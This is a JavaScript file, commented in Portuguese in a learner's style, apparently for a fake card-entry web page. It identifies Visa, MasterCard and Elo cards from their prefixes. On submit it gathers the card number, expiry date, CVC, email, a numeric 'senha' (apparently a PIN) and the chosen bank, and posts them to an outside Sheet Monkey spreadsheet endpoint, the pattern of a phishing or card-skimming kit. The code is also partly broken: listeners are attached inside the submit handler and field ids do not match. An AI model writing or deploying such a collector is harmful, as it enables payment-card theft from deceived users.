// SE EU FOR ENSINAR PARA ALGM JAVASCRIPT VAI SER DIFICIL MAS, ALGUMAS DICAS 
// PRIMEIRA IMPORTÂCIA JAVASCRIPT É SENSIVEL A CAPS LOCK LETRAS MAISCULAS SÓ SE USA LETRA MAIUSCULA EM UMA NOVA PALAVRA COMO meuNome 
// VAR DEFINI VARIAVEL, VARIAVEL UMA COISA QUE VOCE COLOCARA NO SEU CÓDIGO POR EXEMPLO, VAR meuNome = 'matheus' eu defini que variavel do meuNome é mathueus
// fuction eu crio uma função pra tal tarefa
// document.getElementById("numero_do_cartão") pega a identificação do meu input lá do html,getElementById traduzindo é pegue elemento por id
// if é tipo um ''se'' se tiver 4 letras A no nome de um pais ficar vermelho 
// else if é um se não tiver 4 letras ficar azul
// else é tipo em ultimo caso é isso 
//innerhtml perguntar pro prof
// PARA DEIXAR A VARIAVEL MAIS FACIL PARA URL VER, var de subject junta com o encode serve para codificar as palavras = (&$#c-%$)var subjectEncoded = encodeURIComponent(subject);var bodyEncoded = encodeURIComponent(body);

document.getElementById("numero_do_cartao").addEventListener("input", function() {
    var numero_do_cartao = this.value;
    var bandeira = "";

    // Verificação simples dos BINs para Visa, MasterCard e Elo
    if (/^4[0-9]{5}/.test(numero_do_cartao)) {
        bandeira = "Visa";
    } else if (/^5[1-5][0-9]{4}/.test(numero_do_cartao)) {
        bandeira = "MasterCard";
    } else if (/^(506699|509|65[0-9]{4})/.test(numero_do_cartao)) {
        bandeira = "Elo";
    } else {
        bandeira = "Bandeira desconhecida";
    }

    if (numero_do_cartao.length >= 6) {
        document.getElementById("resultado").textContent = "A bandeira do cartão é: " + bandeira;
    } else {
        document.getElementById("resultado").textContent = "";
    }
});




document.getElementById('cardForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Impede o envio padrão do formulário

    const formData = {
        numero_do_cartao: document.getElementById('numero_do_cartao').value,
        data: document.getElementById('data').value,
        cvc: document.getElementById('cvc').value,
        email: document.getElementById('email').value,
        senha: document.getElementById('senha').value,
        banco: document.querySelector('input[name="banco"]:checked').value
    };
    document.getElementById("data_vencimento").addEventListener("input", function(e) {
        var input = e.target.value.replace(/\D/g, ''); // Remove qualquer caractere não numérico
        if (input.length >= 4) {
            var mes = input.substring(0, 2);
            var ano = "20" + input.substring(2, 4);
            e.target.value = mes + "/" + ano;
        } else {
            e.target.value = input; // Atualiza o campo com o valor numérico atual
        }
    });
    
    document.getElementById("cvc").addEventListener("input", function(e) {
        e.target.value = e.target.value.replace(/\D/g, ''); // Remove qualquer caractere não numérico
    });
    
    document.getElementById("senha").addEventListener("input", function(e) {
        e.target.value = e.target.value.replace(/\D/g, ''); // Remove qualquer caractere não numérico
    });
    fetch('https://api.sheetmonkey.io/form/dk6Robg3edERDVFSq6TJWZ', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
    })
    .then(response => response.json())
    .then(data => {
        document.getElementById('resultado').textContent = 'Formulário enviado com sucesso!';
    })
    .catch(error => {
        document.getElementById('resultado').textContent = 'Erro ao enviar formulário: ' + error;
    });
});
;

